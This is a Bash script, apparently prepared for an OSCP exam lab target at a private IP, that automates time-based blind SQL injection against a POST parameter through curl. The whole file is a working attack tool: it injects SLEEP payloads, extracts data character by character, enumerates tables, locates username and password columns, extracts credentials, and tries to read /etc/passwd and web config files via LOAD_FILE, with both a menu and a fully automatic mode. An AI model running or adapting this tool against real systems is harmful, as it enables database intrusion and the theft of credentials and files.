#!/bin/bash

# Time-Based Blind SQL Injection Extraction Scripts
# OSCP Exam Compatible - No SQLMap Required
# Target: 192.168.145.48
# Parameter: mail-list (POST)

# Configuration
TARGET="http://192.168.145.48/index.php"
DELAY=2
PARAM="mail-list"
DEBUG=false

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# ============================================
# Core Functions
# ============================================

# Test if condition is true using time-based blind SQLi
test_condition() {
    local payload="$1"
    local full_payload="${PARAM}=test' AND IF($payload,SLEEP($DELAY),0)-- -"

    if [ "$DEBUG" = true ]; then
        echo -e "${YELLOW}[DEBUG] Testing: $payload${NC}" >&2
    fi

    response_time=$(curl -X POST "$TARGET" \
        -d "$full_payload" \
        -s -w "%{time_total}" -o /dev/null)

    if (( $(echo "$response_time > $DELAY" | bc -l) )); then
        return 0  # True - delay detected
    else
        return 1  # False - no delay
    fi
}

# ============================================
# Extraction Methods
# ============================================

# Method 1: Linear Character Search (Simple but Slow)
extract_char_linear() {
    local query="$1"
    local position="$2"
    local charset="${3:-abcdefghijklmnopqrstuvwxyz0123456789_}"

    for (( i=0; i<${#charset}; i++ )); do
        char="${charset:$i:1}"
        if test_condition "SUBSTRING(($query),$position,1)='$char'"; then
            echo -n "$char"
            return 0
        fi
    done
    return 1
}

# Method 2: Binary Search (Faster)
extract_char_binary() {
    local query="$1"
    local position="$2"
    local low=32   # Start of printable ASCII
    local high=126 # End of printable ASCII

    while [ $low -le $high ]; do
        mid=$(( (low + high) / 2 ))

        if test_condition "ASCII(SUBSTRING(($query),$position,1))>$mid"; then
            low=$((mid + 1))
        else
            high=$((mid - 1))
        fi

        if [ $low -eq $((high + 1)) ]; then
            printf "\\$(printf '%03o' $high)"
            return 0
        fi
    done
    return 1
}

# Method 3: Smart Character Search (Optimized for common chars)
extract_char_smart() {
    local query="$1"
    local position="$2"

    # Try common characters first (statistically more likely)
    local common_chars="aeilnorstu0123456789_"
    for (( i=0; i<${#common_chars}; i++ )); do
        char="${common_chars:$i:1}"
        if test_condition "SUBSTRING(($query),$position,1)='$char'"; then
            echo -n "$char"
            return 0
        fi
    done

    # Fall back to less common characters
    local uncommon_chars="bcdfghjkmpqvwxyz"
    for (( i=0; i<${#uncommon_chars}; i++ )); do
        char="${uncommon_chars:$i:1}"
        if test_condition "SUBSTRING(($query),$position,1)='$char'"; then
            echo -n "$char"
            return 0
        fi
    done

    # Try uppercase if lowercase failed
    local uppercase_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for (( i=0; i<${#uppercase_chars}; i++ )); do
        char="${uppercase_chars:$i:1}"
        if test_condition "SUBSTRING(($query),$position,1)='$char'"; then
            echo -n "$char"
            return 0
        fi
    done

    return 1
}

# ============================================
# String Extraction Functions
# ============================================

# Find length of a string result
find_length() {
    local query="$1"
    local max_len="${2:-50}"

    echo -n -e "${YELLOW}Finding length...${NC} "
    for len in $(seq 1 $max_len); do
        if test_condition "LENGTH(($query))=$len"; then
            echo -e "${GREEN}$len${NC}"
            return $len
        fi
    done
    echo -e "${RED}Failed (>$max_len or empty)${NC}"
    return 0
}

# Extract complete string
extract_string() {
    local query="$1"
    local method="${2:-binary}"  # linear, binary, or smart
    local max_len="${3:-50}"
    local result=""

    # Find length first
    find_length "$query" "$max_len"
    local length=$?

    if [ $length -eq 0 ]; then
        return 1
    fi

    echo -n -e "${YELLOW}Extracting:${NC} "
    for pos in $(seq 1 $length); do
        case $method in
            linear)
                char=$(extract_char_linear "$query" "$pos")
                ;;
            smart)
                char=$(extract_char_smart "$query" "$pos")
                ;;
            *)  # binary (default)
                char=$(extract_char_binary "$query" "$pos")
                ;;
        esac

        if [ $? -eq 0 ]; then
            result="${result}${char}"
            echo -n -e "${GREEN}${char}${NC}"
        else
            echo -n -e "${RED}?${NC}"
        fi
    done
    echo
    echo -e "${GREEN}[+] Result: $result${NC}"
    echo "$result"
}

# ============================================
# Database Enumeration Functions
# ============================================

# Extract database name
get_database() {
    echo -e "\n${YELLOW}=== Extracting Database Name ===${NC}"
    extract_string "database()" "smart" 20
}

# Get table count
get_table_count() {
    echo -e "\n${YELLOW}=== Counting Tables ===${NC}"
    for count in {1..30}; do
        echo -n -e "Testing $count tables... "
        if test_condition "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=$count"; then
            echo -e "${GREEN}Found!${NC}"
            return $count
        else
            echo -e "${RED}no${NC}"
        fi
    done
    return 0
}

# Extract all table names
get_all_tables() {
    get_table_count
    local count=$?

    if [ $count -eq 0 ]; then
        echo -e "${RED}Failed to find table count${NC}"
        return 1
    fi

    echo -e "\n${YELLOW}=== Extracting $count Table Names ===${NC}"
    for i in $(seq 0 $((count-1))); do
        echo -e "\n${YELLOW}Table $((i+1)):${NC}"
        extract_string "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT $i,1" "smart" 30
    done
}

# Find interesting tables
find_interesting_tables() {
    echo -e "\n${YELLOW}=== Searching for Interesting Tables ===${NC}"
    local tables="users user admin administrators accounts members employees credentials passwords login auth"

    for table in $tables; do
        echo -n -e "Checking '$table'... "
        if test_condition "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='$table')=1"; then
            echo -e "${GREEN}EXISTS!${NC}"
        else
            echo -e "${RED}not found${NC}"
        fi
    done
}

# ============================================
# Credential Extraction
# ============================================

# Extract credentials from a table
extract_credentials() {
    local table="${1:-users}"

    echo -e "\n${YELLOW}=== Extracting Credentials from '$table' ===${NC}"

    # Check if table exists
    echo -n "Verifying table exists... "
    if ! test_condition "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='$table')=1"; then
        echo -e "${RED}Table not found!${NC}"
        return 1
    fi
    echo -e "${GREEN}Confirmed${NC}"

    # Find username column
    echo -e "\n${YELLOW}Finding username column:${NC}"
    local username_cols="username user name email login account"
    local found_user_col=""

    for col in $username_cols; do
        echo -n "  Testing '$col'... "
        if test_condition "(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='$table' AND column_name='$col')=1"; then
            echo -e "${GREEN}FOUND!${NC}"
            found_user_col="$col"
            break
        else
            echo -e "${RED}no${NC}"
        fi
    done

    # Find password column
    echo -e "\n${YELLOW}Finding password column:${NC}"
    local password_cols="password pass passwd pwd hash secret"
    local found_pass_col=""

    for col in $password_cols; do
        echo -n "  Testing '$col'... "
        if test_condition "(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='$table' AND column_name='$col')=1"; then
            echo -e "${GREEN}FOUND!${NC}"
            found_pass_col="$col"
            break
        else
            echo -e "${RED}no${NC}"
        fi
    done

    # Extract first row
    if [ -n "$found_user_col" ]; then
        echo -e "\n${YELLOW}Extracting username from $found_user_col:${NC}"
        username=$(extract_string "SELECT $found_user_col FROM $table LIMIT 0,1" "smart" 30)
    fi

    if [ -n "$found_pass_col" ]; then
        echo -e "\n${YELLOW}Extracting password from $found_pass_col:${NC}"
        password=$(extract_string "SELECT $found_pass_col FROM $table LIMIT 0,1" "binary" 64)
    fi

    # Output results
    echo -e "\n${GREEN}=== Credentials Found ===${NC}"
    echo -e "Username: ${GREEN}$username${NC}"
    echo -e "Password: ${GREEN}$password${NC}"
}

# ============================================
# Quick Win Functions
# ============================================

# Try to read files
test_file_read() {
    echo -e "\n${YELLOW}=== Testing File Read Capability ===${NC}"
    local files="/etc/passwd /etc/hosts /var/www/html/config.php /var/www/html/index.php"

    for file in $files; do
        echo -n "Testing $file... "
        if test_condition "LENGTH(LOAD_FILE('$file'))>0"; then
            echo -e "${GREEN}READABLE!${NC}"
            echo "  Extracting first 50 chars:"
            extract_string "SUBSTRING(LOAD_FILE('$file'),1,50)" "binary" 50
        else
            echo -e "${RED}not readable${NC}"
        fi
    done
}

# ============================================
# Main Menu
# ============================================

show_menu() {
    echo -e "\n${YELLOW}=== Time-Based Blind SQLi Extractor ===${NC}"
    echo "Target: $TARGET"
    echo "Delay: ${DELAY}s"
    echo ""
    echo "1) Test injection"
    echo "2) Get database name"
    echo "3) Count tables"
    echo "4) Extract all tables"
    echo "5) Find interesting tables"
    echo "6) Extract credentials"
    echo "7) Test file read"
    echo "8) Custom query"
    echo "9) Full automatic extraction"
    echo "0) Exit"
    echo ""
    echo -n "Choose option: "
}

# Full automatic extraction
auto_extract() {
    echo -e "${YELLOW}=== Starting Automatic Extraction ===${NC}"

    # Test injection
    echo -n "Testing injection... "
    if test_condition "1=1"; then
        echo -e "${GREEN}Working!${NC}"
    else
        echo -e "${RED}Failed!${NC}"
        return 1
    fi

    # Get database
    db_name=$(get_database)
    echo "Database: $db_name"

    # Find interesting tables
    find_interesting_tables

    # Try to extract credentials from common tables
    for table in users user admin administrators; do
        if test_condition "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='$table')=1"; then
            extract_credentials "$table"
            break
        fi
    done
}

# ============================================
# Main Script Logic
# ============================================

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -d|--delay)
            DELAY="$2"
            shift 2
            ;;
        -p|--param)
            PARAM="$2"
            shift 2
            ;;
        --debug)
            DEBUG=true
            shift
            ;;
        -h|--help)
            echo "Usage: $0 [OPTIONS]"
            echo "Options:"
            echo "  -t, --target URL    Target URL (default: http://192.168.145.48/index.php)"
            echo "  -d, --delay SEC     Sleep delay in seconds (default: 2)"
            echo "  -p, --param NAME    Parameter name (default: mail-list)"
            echo "  --debug             Enable debug output"
            echo "  -h, --help          Show this help"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Interactive menu
if [ -t 0 ]; then  # Check if running interactively
    while true; do
        show_menu
        read -r choice

        case $choice in
            1)
                echo -n "Testing injection... "
                if test_condition "1=1"; then
                    echo -e "${GREEN}Working!${NC}"
                else
                    echo -e "${RED}Failed!${NC}"
                fi
                ;;
            2)
                get_database
                ;;
            3)
                get_table_count
                echo "Table count: $?"
                ;;
            4)
                get_all_tables
                ;;
            5)
                find_interesting_tables
                ;;
            6)
                echo -n "Enter table name (default: users): "
                read -r table_name
                table_name="${table_name:-users}"
                extract_credentials "$table_name"
                ;;
            7)
                test_file_read
                ;;
            8)
                echo -n "Enter SQL query: "
                read -r query
                echo -n "Enter extraction method (linear/binary/smart): "
                read -r method
                extract_string "$query" "$method"
                ;;
            9)
                auto_extract
                ;;
            0)
                echo "Exiting..."
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                ;;
        esac
    done
else
    # Non-interactive mode - run auto extraction
    auto_extract
fi